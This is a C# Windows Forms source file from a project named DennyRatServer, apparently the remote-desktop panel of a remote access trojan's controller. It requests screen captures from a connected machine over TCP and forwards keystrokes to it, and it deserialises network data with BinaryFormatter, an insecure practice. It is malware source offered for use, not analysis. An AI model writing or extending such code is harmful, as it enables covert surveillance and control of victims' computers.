using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DennyRatServer
{
    public partial class RemDesk : Form
    {
        TcpClient cli;
        private NetworkStream mainStream;
        private int refresheverymilli = 100;
        private int fps = 10;

        private int compression = 70;

        private bool keyboardenabled = false;
        private bool mouseenabled = false;

        string xres = "1000";
        string yres = "500";

        Size streamsize = new Size(1000, 500);

        public RemDesk(TcpClient client)
        {
            cli = client;
            InitializeComponent();
        }

        private void RemDesk_Load(object sender, EventArgs e)
        {

        }

        protected override void OnClosing(CancelEventArgs e)
        {
            base.OnClosing(e);
            updateImg.Enabled = false;
        }

        private void updateImg_Tick(object sender, EventArgs e)
        {
            SendCommand("getimg::" + compression.ToString() + "::" + (streamsize.Width).ToString() + "::" + (streamsize.Height).ToString());

            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = cli.GetStream();
            Image stre = (Image)binFormatter.Deserialize(mainStream);

            pictureBox1.Image = stre;
        }

        private void SendCommand(string command)
        {
            BinaryFormatter binFormatter = new BinaryFormatter();
            mainStream = cli.GetStream();
            binFormatter.Serialize(mainStream, command);
        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            label1.Text = "FPS: " + trackBar1.Value;
            fps = trackBar1.Value;
            refresheverymilli = Convert.ToInt32(1000f / (float)fps);
            //Console.WriteLine(refresheverymilli.ToString());
        }

        private void trackBar2_Scroll(object sender, EventArgs e)
        {
            compression = 100 - trackBar2.Value;

            label6.Text = "Compression: " + trackBar2.Value.ToString() + "%";
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            //if (!(e is System.Windows.Forms.MouseEventArgs)) return;
            xres = textBox1.Text;
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            yres = textBox1.Text;
        }

        private void RemDesk_KeyDown(object sender, KeyEventArgs e)
        {
            Console.WriteLine("asdfasd");
            if (keyboardenabled)
            {
                if (updateImg.Enabled)
                {

                    string seri = JsonConvert.SerializeObject(e);

                    SendCommand("sendkey::" + seri);
                    
                    BinaryFormatter binFormatter = new BinaryFormatter();

                    mainStream = cli.GetStream();
                    string stre = (string)binFormatter.Deserialize(mainStream);
                }
            }
        }

        private void button1_MouseClick(object sender, MouseEventArgs e)
        {
            if (button1.Text.ToLower().StartsWith("start"))
            {
                int nowresx = 1000;
                int nowresy = 500;
                try
                {
                    nowresx = int.Parse(xres);
                    nowresy = int.Parse(yres);
                }
                catch
                {
                    MessageBox.Show("Resolution incorrect");
                    return;
                }
                streamsize = new Size(nowresx, nowresy);
                textBox1.Enabled = false;
                textBox2.Enabled = false;

                button1.Text = "Stop Stream";
                trackBar1.Enabled = false;
                trackBar2.Enabled = false;
                updateImg.Interval = refresheverymilli;

                updateImg.Enabled = true;
                return;
            }

            if (button1.Text.ToLower().StartsWith("stop"))
            {
                button1.Text = "Start Stream";
                trackBar1.Enabled = true;
                trackBar2.Enabled = true;

                textBox1.Enabled = true;
                textBox2.Enabled = true;

                updateImg.Enabled = false;
                pictureBox1.Image = null;
                return;
            }
        }

        private void checkBox1_MouseClick(object sender, MouseEventArgs e)
        {
            keyboardenabled = checkBox1.Checked;
        }

        private void checkBox2_MouseClick(object sender, MouseEventArgs e)
        {
            mouseenabled = checkBox2.Checked;
        }
    }
}
